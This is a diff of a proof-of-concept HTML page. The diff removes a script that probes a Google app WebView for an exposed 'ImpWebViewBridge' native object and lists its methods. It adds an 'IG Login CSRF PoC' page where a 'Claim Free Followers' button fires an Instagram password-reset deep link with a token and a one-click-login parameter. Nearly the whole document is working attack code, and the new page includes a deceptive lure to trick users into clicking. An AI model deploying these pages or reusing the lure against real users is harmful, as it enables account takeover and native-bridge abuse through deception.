@@ -1,67 +1,13 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>JNI Bridge Detector</title>
-    <style>
-        body { 
-            font-family: 'Courier New', Courier, monospace; 
-            padding: 20px; 
-            background-color: #0d0d0d; 
-            color: #00ff00; 
-            word-wrap: break-word; 
-        }
-        h2 { border-bottom: 1px solid #333; padding-bottom: 10px; }
-        .danger { color: #ff3333; font-weight: bold; font-size: 1.2em; }
-        .success { color: #00ff00; }
-        .info { color: #aaaaaa; }
-    </style>
+    <title>IG Login CSRF PoC</title>
 </head>
 <body>
-    <h2>Google App Native Sandbox Escape</h2>
-    <div id="output">Initializing scanner...<br><br></div>
+    <h1>Clicking the button below will trigger the exploit</h1>
+    <a href="instagram://passwordreset?uidb36=z0m7fu9&token=FX4JogUBEbAVpmlnIcdDiiq38Q4EYd2CMAK731Pqxb3iMTY3cF53s9vZeCtfQIN9:ac_linked_request&v=418.0.0.51.77&s=one_click_login_email">
+        <button style="padding: 20px; font-size: 20px;">Claim Free Followers</button>
+    </a>
 
-    <script>
-        function logMsg(msg) {
-            document.getElementById('output').innerHTML += msg + "<br><br>";
-        }
-
-        window.onload = function() {
-            logMsg("<span class='info'>[i] User-Agent: " + navigator.userAgent + "</span>");
-            logMsg("<span class='info'>[i] Scanning window object for JNI Bridges...</span>");
-
-            // Check for the specific AR/3D bridge we found in your logs
-            if (typeof window.ImpWebViewBridge !== 'undefined' || typeof ImpWebViewBridge !== 'undefined') {
-                logMsg("<span class='danger'>[!!!] CRITICAL IMPACT CONFIRMED [!!!]</span>");
-                logMsg("<span class='danger'>-> ImpWebViewBridge JNI Object is exposed to this remote webpage!</span>");
-                
-                let bridge = window.ImpWebViewBridge || ImpWebViewBridge;
-                
-                // Attempt to dump all exposed methods to prove control
-                let methods = [];
-                try {
-                    for (let prop in bridge) {
-                        if (typeof bridge[prop] === 'function') {
-                            methods.push(prop + "()");
-                        }
-                    }
-                } catch(e) {
-                    logMsg("<span class='info'>[-] Method enumeration blocked by CORS/Proxy, but object exists.</span>");
-                }
-                
-                if(methods.length > 0) {
-                    logMsg("<span class='danger'>[+] Exposed Native Methods found:</span><br>&nbsp;&nbsp;-> " + methods.join("<br>&nbsp;&nbsp;-> "));
-                } else {
-                    logMsg("<span class='danger'>[+] Bridge object instantiated. Ready to accept nativeEntryPoint payloads.</span>");
-                }
-
-                logMsg("<span class='info'>[i] We have successfully bypassed the WebView sandbox and reached the Native C++ layer.</span>");
-
-            } else {
-                logMsg("<span class='info'>[-] ImpWebViewBridge not found. Not running inside ViewerLauncher context.</span>");
-            }
-        };
-    </script>
-</body>
-
+    </body>
 </html>
